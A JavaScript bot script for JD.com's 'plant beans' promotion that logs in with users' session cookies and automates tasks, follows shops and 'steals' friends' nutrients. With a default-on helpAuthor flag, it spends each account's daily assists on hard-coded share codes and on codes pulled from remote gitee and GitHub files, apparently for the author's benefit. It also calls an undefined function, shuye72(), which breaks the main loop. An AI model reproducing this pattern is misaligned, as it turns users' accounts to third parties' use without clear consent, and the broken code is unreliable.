/*
种豆得豆 脚本更新地址：https://gitee.com/lxk0301/jd_scripts/raw/master/jd_plantBean.js
更新时间：2021-1-16
活动入口：京东APP我的-更多工具-种豆得豆
已支持IOS京东双账号,云端N个京东账号
脚本兼容:QuantumultX,Surge,Loon,JSBox,Node.js
注：会自动关注任务中的店铺跟商品，介意者勿使用。
互助码shareCode请先手动运行脚本查看打印可看到
每个京东账号每天只能帮助3个人。多出的助力码将会助力失败。
=====================================Quantumult X=================================
[task_local]
1 7-21/2 * * * https://gitee.com/lxk0301/jd_scripts/raw/master/jd_plantBean.js, tag=种豆得豆, img-url=https://raw.githubusercontent.com/58xinian/icon/master/jdzd.png, enabled=true

=====================================Loon================================
[Script]
cron "1 7-21/2 * * *" script-path=https://gitee.com/lxk0301/jd_scripts/raw/master/jd_plantBean.js,tag=京东种豆得豆

======================================Surge==========================
京东种豆得豆 = type=cron,cronexp="1 7-21/2 * * *",wake-system=1,timeout=3600,script-path=https://gitee.com/lxk0301/jd_scripts/raw/master/jd_plantBean.js

====================================小火箭=============================
京东种豆得豆 = type=cron,script-path=https://gitee.com/lxk0301/jd_scripts/raw/master/jd_plantBean.js, cronexpr="1 7-21/2 * * *", timeout=3600, enable=true

搬的https://github.com/uniqueque/QuantumultX/blob/4c1572d93d4d4f883f483f907120a75d925a693e/Script/jd_plantBean.js
*/
const $ = new Env('京东种豆得豆');
//Node.js用户请在jdCookie.js处填写京东ck;
//ios等软件用户直接用NobyDa的jd cookie
let jdNotify = true;//是否开启静默运行。默认true开启
let cookiesArr = [], cookie = '', jdPlantBeanShareArr = [], isBox = false, notify, newShareCodes, option, message,subTitle;
//京东接口地址
const JD_API_HOST = 'https://api.m.jd.com/client.action';
//助力好友分享码(最多3个,否则后面的助力失败)
//此此内容是IOS用户下载脚本到本地使用，填写互助码的地方，同一京东账号的好友互助码请使用@符号隔开。
//下面给出两个账号的填写示例（iOS只支持2个京东账号）
let shareCodes = [ // IOS本地脚本用户这个列表填入你要助力的好友的shareCode
                   //账号一的好友shareCode,不同好友的shareCode中间用@符号隔开
  '3xd6hi7wz3detzueuft3fjnaq6shonvreqhvugy@nkvdrkoit5o65hgsezt2hkynoeq3olf63v6icua@fb227jqogvovf4dzt65kyksuqq3h7wlwy7o5jii@2glpkm3dt2ujt5eufktgoxeewa5ac3f4ijdgqji@anvpoh7gttncs535ikqc3dfbbsnst3auzw6gmjq@e7lhibzb3zek3l2je2y7rjczlz3sq4c6e2r72di@mlrdw3aw26j3xrwlavyve554fsprq7lxnn2esoa@7ii2tqua5cw4cuvznmvewfo7gbrfz5c4dyurxen5sazkv5ctbrdq',
  //账号二的好友shareCode,不同好友的shareCode中间用@符号隔开
  '3xd6hi7wz3detzueuft3fjnaq6shonvreqhvugy@nkvdrkoit5o65hgsezt2hkynoeq3olf63v6icua@fb227jqogvovf4dzt65kyksuqq3h7wlwy7o5jii@2glpkm3dt2ujt5eufktgoxeewa5ac3f4ijdgqji@anvpoh7gttncs535ikqc3dfbbsnst3auzw6gmjq@e7lhibzb3zek3l2je2y7rjczlz3sq4c6e2r72di@mlrdw3aw26j3xrwlavyve554fsprq7lxnn2esoa@7ii2tqua5cw4cuvznmvewfo7gbrfz5c4dyurxen5sazkv5ctbrdq',
]
let allMessage = ``;
let currentRoundId = null;//本期活动id
let lastRoundId = null;//上期id
let roundList = [];
let awardState = '';//上期活动的京豆是否收取
let helpAuthor = true;
!(async () => {
  await requireConfig();
  if (!cookiesArr[0]) {
    $.msg($.name, '【提示】请先获取京东账号一cookie\n直接使用NobyDa的京东签到获取', 'https://bean.m.jd.com/bean/signIndex.action', {"open-url": "https://bean.m.jd.com/bean/signIndex.action"});
    return;
  }
  for (let i = 0; i < cookiesArr.length; i++) {
    if (cookiesArr[i]) {
      cookie = cookiesArr[i];
      $.UserName = decodeURIComponent(cookie.match(/pt_pin=([^; ]+)(?=;?)/) && cookie.match(/pt_pin=([^; ]+)(?=;?)/)[1])
      $.index = i + 1;
      $.isLogin = true;
      $.nickName = '';
      await TotalBean();
      console.log(`\n开始【京东账号${$.index}】${$.nickName || $.UserName}\n`);
      if (!$.isLogin) {
        $.msg($.name, `【提示】cookie已失效`, `京东账号${$.index} ${$.nickName || $.UserName}\n请重新登录获取\nhttps://bean.m.jd.com/bean/signIndex.action`, {"open-url": "https://bean.m.jd.com/bean/signIndex.action"});

        if ($.isNode()) {
          await notify.sendNotify(`${$.name}cookie已失效 - ${$.UserName}`, `京东账号${$.index} ${$.UserName}\n请重新登录获取cookie`);
        }
        continue
      }
      message = '';
      subTitle = '';
      option = {};
      await shareCodesFormat();
      if(helpAuthor){
        shuye72()
      }
      await jdPlantBean();
      await showMsg();
    }
  }
  if ($.isNode() && allMessage) {
    await notify.sendNotify(`${$.name}`, `${allMessage}`)
  }
})().catch((e) => {
  $.log('', `❌ ${$.name}, 失败! 原因: ${e}!`, '')
}).finally(() => {
  $.done();
})

async function jdPlantBean() {
  try {
    console.log(`获取任务及基本信息`)
    await plantBeanIndex();
    // console.log(plantBeanIndexResult.data.taskList);
    if ($.plantBeanIndexResult && $.plantBeanIndexResult.code === '0') {
      const shareUrl = $.plantBeanIndexResult.data.jwordShareInfo.shareUrl
      $.myPlantUuid = getParam(shareUrl, 'plantUuid')
      console.log(`\n【京东账号${$.index}（${$.UserName}）的${$.name}好友互助码】${$.myPlantUuid}\n`);
      roundList = $.plantBeanIndexResult.data.roundList;
      currentRoundId = roundList[1].roundId;//本期的roundId
      lastRoundId = roundList[0].roundId;//上期的roundId
      awardState = roundList[0].awardState;
      $.taskList = $.plantBeanIndexResult.data.taskList;
      subTitle = `【京东昵称】${$.plantBeanIndexResult.data.plantUserInfo.plantNickName}`;
      message += `【上期时间】${roundList[0].dateDesc.replace('上期 ', '')}\n`;
      message += `【上期成长值】${roundList[0].growth}\n`;
      await receiveNutrients();//定时领取营养液
      await doHelp();//助力
      await doTask();//做日常任务
      await doEgg();
      await stealFriendWater();
      await doCultureBean();
      await doGetReward();
      await showTaskProcess();
      await plantShareSupportList();
    } else {
      console.log(`种豆得豆-初始失败:  ${JSON.stringify($.plantBeanIndexResult)}`);
    }
  } catch (e) {
    $.logErr(e);
    const errMsg = `京东账号${$.index} ${$.nickName || $.UserName}\n任务执行异常，请检查执行日志 ‼️‼️`;
    if ($.isNode()) await notify.sendNotify(`${$.name}`, errMsg);
    $.msg($.name, '', `京东账号${$.index} ${$.nickName || $.UserName}\n${errMsg}`)
  }
}
async function doGetReward() {
  console.log(`【上轮京豆】${awardState === '4' ? '采摘中' : awardState === '5' ? '可收获了' : '已领取'}`);
  if (awardState === '4') {
    //京豆采摘中...
    message += `【上期状态】${roundList[0].tipBeanEndTitle}\n`;
  } else if (awardState === '5') {
    //收获
    await getReward();
    console.log('开始领取京豆');
    if ($.getReward && $.getReward.code === '0') {
      console.log('京豆领取成功');
      message += `【上期兑换京豆】${$.getReward.data.awardBean}个\n`;
      $.msg($.name, subTitle, message);
      allMessage += `京东账号${$.index} ${$.nickName}\n${message}${$.index !== cookiesArr.length ? '\n\n' : ''}`
      // if ($.isNode()) {
      //   await notify.sendNotify(`${$.name} - 账号${$.index} - ${$.nickName || $.UserName}`, `京东账号${$.index} ${$.nickName}\n${message}`);
      // }
    } else {
      console.log(`$.getReward 异常：${JSON.stringify($.getReward)}`)
    }
  } else if (awardState === '6') {
    //京豆已领取
    message += `【上期兑换京豆】${roundList[0].awardBeans}个\n`;
  }
  if (roundList[1].dateDesc.indexOf('本期 ') > -1) {
    roundList[1].dateDesc = roundList[1].dateDesc.substr(roundList[1].dateDesc.indexOf('本期 ') + 3, roundList[1].dateDesc.length);
  }
  message += `【本期时间】${roundList[1].dateDesc}\n`;
  message += `【本期成长值】${roundList[1].growth}\n`;
}
async function doCultureBean() {
  await plantBeanIndex();
  if ($.plantBeanIndexResult && $.plantBeanIndexResult.code === '0') {
    const plantBeanRound = $.plantBeanIndexResult.data.roundList[1]
    if (plantBeanRound.roundState === '2') {
      //收取营养液
      if (plantBeanRound.bubbleInfos && plantBeanRound.bubbleInfos.length) console.log(`开始收取营养液`)
      for (let bubbleInfo of plantBeanRound.bubbleInfos) {
        console.log(`收取-${bubbleInfo.name}-的营养液`)
        await cultureBean(plantBeanRound.roundId, bubbleInfo.nutrientsType)
        console.log(`收取营养液结果:${JSON.stringify($.cultureBeanRes)}`)
      }
    }
  } else {
    console.log(`plantBeanIndexResult:${JSON.stringify($.plantBeanIndexResult)}`)
  }
}
async function stealFriendWater() {
  await stealFriendList();
  if ($.stealFriendList && $.stealFriendList.code === '0') {
    if ($.stealFriendList.data.tips) {
      console.log('偷取好友营养液今日已达上限');
      return
    }
    if ($.stealFriendList.data && $.stealFriendList.data.friendInfoList && $.stealFriendList.data.friendInfoList.length > 0) {
      let nowTimes = new Date(new Date().getTime() + new Date().getTimezoneOffset()*60*1000 + 8*60*60*1000);
      for (let item of $.stealFriendList.data.friendInfoList) {
        if (new Date(nowTimes).getHours() === 20) {
          if (item.nutrCount >= 2) {
            // console.log(`可以偷的好友的信息::${JSON.stringify(item)}`);
            console.log(`可以偷的好友的信息paradiseUuid::${JSON.stringify(item.paradiseUuid)}`);
            await collectUserNutr(item.paradiseUuid);
            console.log(`偷取好友营养液情况:${JSON.stringify($.stealFriendRes)}`)
            if ($.stealFriendRes && $.stealFriendRes.code === '0') {
              console.log(`偷取好友营养液成功`)
            }
          }
        } else {
          if (item.nutrCount >= 3) {
            // console.log(`可以偷的好友的信息::${JSON.stringify(item)}`);
            console.log(`可以偷的好友的信息paradiseUuid::${JSON.stringify(item.paradiseUuid)}`);
            await collectUserNutr(item.paradiseUuid);
            console.log(`偷取好友营养液情况:${JSON.stringify($.stealFriendRes)}`)
            if ($.stealFriendRes && $.stealFriendRes.code === '0') {
              console.log(`偷取好友营养液成功`)
            }
          }
        }
      }
    }
  } else {
    console.log(`$.stealFriendList 异常： ${JSON.stringify($.stealFriendList)}`)
  }
}
async function doEgg() {
  await egg();
  if ($.plantEggLotteryRes && $.plantEggLotteryRes.code === '0') {
    if ($.plantEggLotteryRes.data.restLotteryNum > 0) {
      const eggL = new Array($.plantEggLotteryRes.data.restLotteryNum).fill('');
      console.log(`目前共有${eggL.length}次扭蛋的机会`)
      for (let i = 0; i < eggL.length; i++) {
        console.log(`开始第${i + 1}次扭蛋`);
        await plantEggDoLottery();
        console.log(`天天扭蛋成功：${JSON.stringify($.plantEggDoLotteryResult)}`);
      }
    } else {
      console.log('暂无扭蛋机会')
    }
  } else {
    console.log('查询天天扭蛋的机会失败' + JSON.stringify($.plantEggLotteryRes))
  }
}
async function doTask() {
  if ($.taskList && $.taskList.length > 0) {
    for (let item of $.taskList) {
      if (item.isFinished === 1) {
        console.log(`${item.taskName} 任务已完成\n`);
        continue;
      } else {
        if (item.taskType === 8) {
          console.log(`\n【${item.taskName}】任务未完成,需自行手动去京东APP完成，${item.desc}营养液\n`)
        } else {
          console.log(`\n【${item.taskName}】任务未完成,${item.desc}营养液\n`)
        }
      }
      if (item.dailyTimes === 1 && item.taskType !== 8) {
        console.log(`\n开始做 ${item.taskName}任务`);
        // $.receiveNutrientsTaskRes = await receiveNutrientsTask(item.taskType);
        await receiveNutrientsTask(item.taskType);
        console.log(`做 ${item.taskName}任务结果:${JSON.stringify($.receiveNutrientsTaskRes)}\n`);
      }
      if (item.taskType === 3) {
        //浏览店铺
        console.log(`开始做 ${item.taskName}任务`);
        let unFinishedShopNum = item.totalNum - item.gainedNum;
        if (unFinishedShopNum === 0) {
          continue
        }
        await shopTaskList();
        const { data } = $.shopTaskListRes;
        let goodShopListARR = [], moreShopListARR = [], shopList = [];
        const { goodShopList, moreShopList } = data;
        for (let i of goodShopList) {
          if (i.taskState === '2') {
            goodShopListARR.push(i);
          }
        }
        for (let j of moreShopList) {
          if (j.taskState === '2') {
            moreShopListARR.push(j);
          }
        }
        shopList = goodShopListARR.concat(moreShopListARR);
        for (let shop of shopList) {
          const { shopId, shopTaskId } = shop;
          const body = {
            "monitor_refer": "plant_shopNutrientsTask",
            "shopId": shopId,
            "shopTaskId": shopTaskId
          }
          const shopRes = await requestGet('shopNutrientsTask', body);
          console.log(`shopRes结果:${JSON.stringify(shopRes)}`);
          if (shopRes && shopRes.code === '0') {
            if (shopRes.data && shopRes.data.nutrState && shopRes.data.nutrState === '1') {
              unFinishedShopNum --;
            }
          }
          if (unFinishedShopNum <= 0) {
            console.log(`${item.taskName}任务已做完\n`)
            break;
          }
        }
      }
      if (item.taskType === 5) {
        //挑选商品
        console.log(`开始做 ${item.taskName}任务`);
        let unFinishedProductNum = item.totalNum - item.gainedNum;
        if (unFinishedProductNum === 0) {
          continue
        }
        await productTaskList();
        // console.log('productTaskList', $.productTaskList);
        const { data } = $.productTaskList;
        let productListARR = [], productList = [];
        const { productInfoList } = data;
        for (let i = 0; i < productInfoList.length; i++) {
          for (let j = 0; j < productInfoList[i].length; j++){
            productListARR.push(productInfoList[i][j]);
          }
        }
        for (let i of productListARR) {
          if (i.taskState === '2') {
            productList.push(i);
          }
        }
        for (let product of productList) {
          const { skuId, productTaskId } = product;
          const body = {
            "monitor_refer": "plant_productNutrientsTask",
            "productTaskId": productTaskId,
            "skuId": skuId
          }
          const productRes = await requestGet('productNutrientsTask', body);
          if (productRes && productRes.code === '0') {
            // console.log('nutrState', productRes)
            //这里添加多重判断,有时候会出现活动太火爆的问题,导致nutrState没有
            if (productRes.data && productRes.data.nutrState && productRes.data.nutrState === '1') {
              unFinishedProductNum --;
            }
          }
          if (unFinishedProductNum <= 0) {
            console.log(`${item.taskName}任务已做完\n`)
            break;
          }
        }
      }
      if (item.taskType === 10) {
        //关注频道
        console.log(`开始做 ${item.taskName}任务`);
        let unFinishedChannelNum = item.totalNum - item.gainedNum;
        if (unFinishedChannelNum === 0) {
          continue
        }
        await plantChannelTaskList();
        const { data } = $.plantChannelTaskList;
        // console.log('goodShopList', data.goodShopList);
        // console.log('moreShopList', data.moreShopList);
        let goodChannelListARR = [], normalChannelListARR = [], channelList = [];
        const { goodChannelList, normalChannelList } = data;
        for (let i of goodChannelList) {
          if (i.taskState === '2') {
            goodChannelListARR.push(i);
          }
        }
        for (let j of normalChannelList) {
          if (j.taskState === '2') {
            normalChannelListARR.push(j);
          }
        }
        channelList = goodChannelListARR.concat(normalChannelListARR);
        for (let channelItem of channelList) {
          const { channelId, channelTaskId } = channelItem;
          const body = {
            "channelId": channelId,
            "channelTaskId": channelTaskId
          }
          const channelRes = await requestGet('plantChannelNutrientsTask', body);
          console.log(`channelRes结果:${JSON.stringify(channelRes)}`);
          if (channelRes && channelRes.code === '0') {
            if (channelRes.data && channelRes.data.nutrState && channelRes.data.nutrState === '1') {
              unFinishedChannelNum --;
            }
          }
          if (unFinishedChannelNum <= 0) {
            console.log(`${item.taskName}任务已做完\n`)
            break;
          }
        }
      }
    }
  }
}
function showTaskProcess() {
  return new Promise(async resolve => {
    await plantBeanIndex();
    $.taskList = $.plantBeanIndexResult.data.taskList;
    if ($.taskList && $.taskList.length > 0) {
      console.log("     任务   进度");
      for (let item of $.taskList) {
        console.log(`[${item["taskName"]}]  ${item["gainedNum"]}/${item["totalNum"]}   ${item["isFinished"]}`);
      }
    }
    resolve()
  })
}
//助力好友
async function doHelp() {
  for (let plantUuid of newShareCodes) {
    console.log(`开始助力京东账号${$.index} - ${$.nickName}的好友: ${plantUuid}`);
    if (!plantUuid) continue;
    if (plantUuid === $.myPlantUuid) {
      console.log(`\n跳过自己的plantUuid\n`)
      continue
    }
    await helpShare(plantUuid);
    if ($.helpResult && $.helpResult.code === '0') {
      // console.log(`助力好友结果: ${JSON.stringify($.helpResult.data.helpShareRes)}`);
      if ($.helpResult.data.helpShareRes) {
        if ($.helpResult.data.helpShareRes.state === '1') {
          console.log(`助力好友${plantUuid}成功`)
          console.log(`${$.helpResult.data.helpShareRes.promptText}\n`);
        } else if ($.helpResult.data.helpShareRes.state === '2') {
          console.log('您今日助力的机会已耗尽，已不能再帮助好友助力了\n');
          break;
        } else if ($.helpResult.data.helpShareRes.state === '3') {
          console.log('该好友今日已满9人助力/20瓶营养液,明天再来为Ta助力吧\n')
        } else if ($.helpResult.data.helpShareRes.state === '4') {
          console.log(`${$.helpResult.data.helpShareRes.promptText}\n`)
        } else {
          console.log(`助力其他情况：${JSON.stringify($.helpResult.data.helpShareRes)}`);
        }
      }
    } else {
      console.log(`助力好友失败: ${JSON.stringify($.helpResult)}`);
    }
  }
}
function showMsg() {
  $.log(`\n${message}\n`);
  jdNotify = $.getdata('jdPlantBeanNotify') ? $.getdata('jdPlantBeanNotify') : jdNotify;
  if (!jdNotify || jdNotify === 'false') {
    $.msg($.name, subTitle, message);
  }
}
// ================================================此处是API=================================
//每轮种豆活动获取结束后,自动收取京豆
async function getReward() {
  const body = {
    "roundId": lastRoundId
  }
  $.getReward = await request('receivedBean', body);
}
//收取营养液
async function cultureBean(currentRoundId, nutrientsType) {
  let functionId = arguments.callee.name.toString();
  let body = {
    "roundId": currentRoundId,
    "nutrientsType": nutrientsType,
  }
  $.cultureBeanRes = await request(functionId, body);
}
//偷营养液大于等于3瓶的好友
//①查询好友列表
async function stealFriendList() {
  const body = {
    pageNum: '1'
  }
  $.stealFriendList = await request('plantFriendList', body);
}

//②执行偷好友营养液的动作
async function collectUserNutr(paradiseUuid) {
  console.log('开始偷好友');
  // console.log(paradiseUuid);
  let functionId = arguments.callee.name.toString();
  const body = {
    "paradiseUuid": paradiseUuid,
    "roundId": currentRoundId
  }
  $.stealFriendRes = await request(functionId, body);
}
async function receiveNutrients() {
  $.receiveNutrientsRes = await request('receiveNutrients', {"roundId": currentRoundId, "monitor_refer": "plant_receiveNutrients"})
  // console.log(`定时领取营养液结果:${JSON.stringify($.receiveNutrientsRes)}`)
}
async function plantEggDoLottery() {
  $.plantEggDoLotteryResult = await requestGet('plantEggDoLottery');
}
//查询天天扭蛋的机会
async function egg() {
  $.plantEggLotteryRes = await requestGet('plantEggLotteryIndex');
}
async function productTaskList() {
  let functionId = arguments.callee.name.toString();
  $.productTaskList = await requestGet(functionId, {"monitor_refer": "plant_productTaskList"});
}
async function plantChannelTaskList() {
  let functionId = arguments.callee.name.toString();
  $.plantChannelTaskList = await requestGet(functionId);
  // console.log('$.plantChannelTaskList', $.plantChannelTaskList)
}
async function shopTaskList() {
  let functionId = arguments.callee.name.toString();
  $.shopTaskListRes = await requestGet(functionId, {"monitor_refer": "plant_receiveNutrients"});
  // console.log('$.shopTaskListRes', $.shopTaskListRes)
}
async function receiveNutrientsTask(awardType) {
  const functionId = arguments.callee.name.toString();
  const body = {
    "monitor_refer": "receiveNutrientsTask",
    "awardType": `${awardType}`,
  }
  $.receiveNutrientsTaskRes = await requestGet(functionId, body);
}
async function plantShareSupportList() {
  $.shareSupportList = await requestGet('plantShareSupportList', {"roundId": ""});
  if ($.shareSupportList && $.shareSupportList.code === '0') {
    const { data } = $.shareSupportList;
    //当日北京时间0点时间戳
    const UTC8_Zero_Time = parseInt((Date.now() + 28800000) / 86400000) * 86400000 - 28800000;
    //次日北京时间0点时间戳
    const UTC8_End_Time = parseInt((Date.now() + 28800000) / 86400000) * 86400000 - 28800000 + (24 * 60 * 60 * 1000);
    let friendList = [];
    data.map(item => {
      if (UTC8_Zero_Time <= item['createTime'] && item['createTime'] < UTC8_End_Time) {
        friendList.push(item);
      }
    })
    message += `【助力您的好友】共${friendList.length}人`;
  } else {
    console.log(`异常情况：${JSON.stringify($.shareSupportList)}`)
  }
}
//助力好友的api
async function helpShare(plantUuid) {
  console.log(`\n开始助力好友: ${plantUuid}`);
  const body = {
    "plantUuid": plantUuid,
    "wxHeadImgUrl": "",
    "shareUuid": "",
    "followType": "1",
  }
  $.helpResult = await request(`plantBeanIndex`, body);
  console.log(`助力结果的code:${$.helpResult && $.helpResult.code}`);
}
async function plantBeanIndex() {
  $.plantBeanIndexResult = await request('plantBeanIndex');//plantBeanIndexBody
}
function readShareCode() {
  console.log(`开始`)
  return new Promise(async resolve => {
    $.get({url: "https://gitee.com/Soundantony/RandomShareCode/raw/master/JD_Plant_Bean.json",headers:{
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1 Edg/87.0.4280.88"
      }}, async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，将切换为备用API`)
          console.log(`随机取助力码放到您固定的互助码后面(不影响已有固定互助)`)
          $.get({url: `https://raw.githubusercontent.com/shuyeshuye/RandomShareCode/main/JD_Plant_Bean.json`, 'timeout': 10000},(err, resp, data)=>{
          data = JSON.parse(data);})
        } else {
          if (data) {
            console.log(`随机取助力码放到您固定的互助码后面(不影响已有固定互助)`)
            data = JSON.parse(data);
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve(data);
      }
    })
    await $.wait(15000);
    resolve()
  })
}
//格式化助力码
function shareCodesFormat() {
  return new Promise(async resolve => {
    // console.log(`第${$.index}个京东账号的助力码:::${jdPlantBeanShareArr[$.index - 1]}`)
    newShareCodes = [];
    if (jdPlantBeanShareArr[$.index - 1]) {
      newShareCodes = jdPlantBeanShareArr[$.index - 1].split('@');
    } else {
      console.log(`由于您第${$.index}个京东账号未提供shareCode,将采纳本脚本自带的助力码\n`)
      const tempIndex = $.index > shareCodes.length ? (shareCodes.length - 1) : ($.index - 1);
      newShareCodes = shareCodes[tempIndex].split('@');
    }
    const readShareCodeRes = await readShareCode();
    if (readShareCodeRes && readShareCodeRes.code === 200) {
      newShareCodes = [...new Set([...newShareCodes, ...(readShareCodeRes.data || [])])];
    }
    console.log(`第${$.index}个京东账号将要助力的好友${JSON.stringify(newShareCodes)}`)
    resolve();
  })
}
function requireConfig() {
  return new Promise(resolve => {
    console.log('开始获取种豆得豆配置文件\n')
    notify = $.isNode() ? require('./sendNotify') : '';
    //Node.js用户请在jdCookie.js处填写京东ck;
    const jdCookieNode = $.isNode() ? require('./jdCookie.js') : '';
    const jdPlantBeanShareCodes = $.isNode() ? require('./jdPlantBeanShareCodes.js') : '';
    //IOS等用户直接用NobyDa的jd cookie
    if ($.isNode()) {
      Object.keys(jdCookieNode).forEach((item) => {
        if (jdCookieNode[item]) {
          cookiesArr.push(jdCookieNode[item])
        }
      })
      if (process.env.JD_DEBUG && process.env.JD_DEBUG === 'false') console.log = () => {};
    } else {
      cookiesArr = [$.getdata('CookieJD'), $.getdata('CookieJD2'), ...jsonParse($.getdata('CookiesJD') || "[]").map(item => item.cookie)].filter(item => !!item);
    }
    console.log(`共${cookiesArr.length}个京东账号\n`)
    if ($.isNode()) {
      Object.keys(jdPlantBeanShareCodes).forEach((item) => {
        if (jdPlantBeanShareCodes[item]) {
          jdPlantBeanShareArr.push(jdPlantBeanShareCodes[item])
        }
      })
    } else {
      const boxShareCodeArr = ['jd_plantBean1', 'jd_plantBean2', 'jd_plantBean3'];
      const boxShareCodeArr2 = ['jd2_plantBean1', 'jd2_plantBean2', 'jd2_plantBean3'];
      const isBox1 = boxShareCodeArr.some((item) => {
        const boxShareCode = $.getdata(item);
        return (boxShareCode !== undefined && boxShareCode !== null && boxShareCode !== '');
      });
      const isBox2 = boxShareCodeArr2.some((item) => {
        const boxShareCode = $.getdata(item);
        return (boxShareCode !== undefined && boxShareCode !== null && boxShareCode !== '');
      });
      isBox = isBox1 ? isBox1 : isBox2;
      if (isBox1) {
        let temp = [];
        for (const item of boxShareCodeArr) {
          if ($.getdata(item)) {
            temp.push($.getdata(item))
          }
        }
        jdPlantBeanShareArr.push(temp.join('@'));
      }
      if (isBox2) {
        let temp = [];
        for (const item of boxShareCodeArr2) {
          if ($.getdata(item)) {
            temp.push($.getdata(item))
          }
        }
        jdPlantBeanShareArr.push(temp.join('@'));
      }
    }
    // console.log(`\n种豆得豆助力码::${JSON.stringify(jdPlantBeanShareArr)}`);
    console.log(`您提供了${jdPlantBeanShareArr.length}个账号的种豆得豆助力码\n`);
    resolve()
  })
}
function requestGet(function_id, body = {}) {
  if (!body.version) {
    body["version"] = "9.0.0.1";
  }
  body["monitor_source"] = "plant_app_plant_index";
  body["monitor_refer"] = "";
  return new Promise(async resolve => {
    await $.wait(2000);
    const option = {
      url: `${JD_API_HOST}?functionId=${function_id}&body=${escape(JSON.stringify(body))}&appid=ld`,
      headers: {
        'Cookie': cookie,
        'Host': 'api.m.jd.com',
        'Accept': '*/*',
        'Connection': 'keep-alive',
        'User-Agent': 'JD4iPhone/167283 (iPhone;iOS 13.6.1;Scale/3.00)',
        'Accept-Language': 'zh-Hans-CN;q=1,en-CN;q=0.9',
        'Accept-Encoding': 'gzip, deflate, br',
        'Content-Type': "application/x-www-form-urlencoded"
      },
      timeout: 10000,
    };
    $.get(option, (err, resp, data) => {
      try {
        if (err) {
          console.log('\n种豆得豆: API查询请求失败 ‼️‼️')
          $.logErr(err);
        } else {
          data = JSON.parse(data);
        }
      } catch (e) {
        $.logErr(e, resp);
      } finally {
        resolve(data);
      }
    })
  })
}
function TotalBean() {
  return new Promise(async resolve => {
    const options = {
      "url": `https://wq.jd.com/user/info/QueryJDUserInfo?sceneval=2`,
      "headers": {
        "Accept": "application/json,text/plain, */*",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "zh-cn",
        "Connection": "keep-alive",
        "Cookie": cookie,
        "Referer": "https://wqs.jd.com/my/jingdou/my.shtml?sceneval=2",
        "User-Agent": $.isNode() ? (process.env.JD_USER_AGENT ? process.env.JD_USER_AGENT : (require('./USER_AGENTS').USER_AGENT)) : ($.getdata('JDUA') ? $.getdata('JDUA') : "jdapp;iPhone;9.4.4;14.3;network/4g;Mozilla/5.0 (iPhone; CPU iPhone OS 14_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148;supportJDSHWK/1")
      },
      "timeout": 10000,
    }
    $.post(options, (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (data) {
            data = JSON.parse(data);
            if (data['retcode'] === 13) {
              $.isLogin = false; //cookie过期
              return
            }
            if (data['retcode'] === 0) {
              $.nickName = (data['base'] && data['base'].nickname) || $.UserName;
            } else {
              $.nickName = $.UserName
            }
          } else {
            console.log(`京东服务器返回空数据`)
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve();
      }
    })
  })
}
function request(function_id, body = {}){
  return new Promise(async resolve => {
    await $.wait(2000);
    $.post(taskUrl(function_id, body), (err, resp, data) => {
      try {
        if (err) {
          console.log('\n种豆得豆: API查询请求失败 ‼️‼️')
          console.log(`function_id:${function_id}`)
          $.logErr(err);
        } else {
          data = JSON.parse(data);
        }
      } catch (e) {
        $.logErr(e, resp);
      } finally {
        resolve(data);
      }
    })
  })
}
function taskUrl(function_id, body) {
  body["version"] = "9.2.4.0";
  body["monitor_source"] = "plant_app_plant_index";
  body["monitor_refer"] = "";
  return {
    url: JD_API_HOST,
    body: `functionId=${function_id}&body=${escape(JSON.stringify(body))}&appid=ld&client=apple&area=19_1601_50258_51885&build=167490&clientVersion=9.3.2`,
    headers: {
      "Cookie": cookie,
      "Host": "api.m.jd.com",
      "Accept": "*/*",
      "Connection": "keep-alive",
      "User-Agent": $.isNode() ? (process.env.JD_USER_AGENT ? process.env.JD_USER_AGENT : (require('./USER_AGENTS').USER_AGENT)) : ($.getdata('JDUA') ? $.getdata('JDUA') : "jdapp;iPhone;9.4.4;14.3;network/4g;Mozilla/5.0 (iPhone; CPU iPhone OS 14_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148;supportJDSHWK/1"),
      "Accept-Language": "zh-Hans-CN;q=1,en-CN;q=0.9",
      "Accept-Encoding": "gzip, deflate, br",
      "Content-Type": "application/x-www-form-urlencoded"
    },
    timeout: 10000,
  }
}
function getParam(url, name) {
  const reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)", "i")
  const r = url.match(reg)
  if (r != null) return unescape(r[2]);
  return null;
}
function jsonParse(str) {
  if (typeof str == "string") {
    try {
      return JSON.parse(str);
    } catch (e) {
      console.log(e);
      $.msg($.name, '', '请勿随意在BoxJs输入框修改内容\n建议通过脚本去获取cookie')
      return [];
    }
  }
}
